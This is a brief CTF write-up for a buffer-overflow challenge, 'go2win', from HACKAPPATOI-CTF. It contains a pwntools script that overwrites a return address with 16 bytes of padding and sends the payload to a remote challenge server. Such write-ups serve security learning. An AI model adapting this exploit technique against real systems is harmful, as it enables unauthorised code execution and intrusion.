# HACKAPPATOI-CTF

## Pwn
===============

## PwN 1 
The first chall a buffer overflow, attachments are one binary file. `go2win`
<img src="https://github.com/q5fj/Pwn/assets/88992167/be74445f-eef9-4e89-a757-d2b4216a8807">
<img src="https://github.com/q5fj/Pwn/assets/88992167/a1ab01e1-ce27-45c3-90f1-6d5aa3f8b390">
```
import shutup; shutup.please()
from pwn import *

elf = context.binary = ELF('./go2win')
io = elf.process()

io = remote('92.246.89.201', 10003)

offset = 16

payload = b''
payload += b'A' * offset 
payload += p64(0x47f7a0)

io.sendline(payload)
io.interactive()
```
<img src="https://github.com/q5fj/Pwn/assets/88992167/04fba138-c8a4-4797-96e9-7938cde7ae9c">




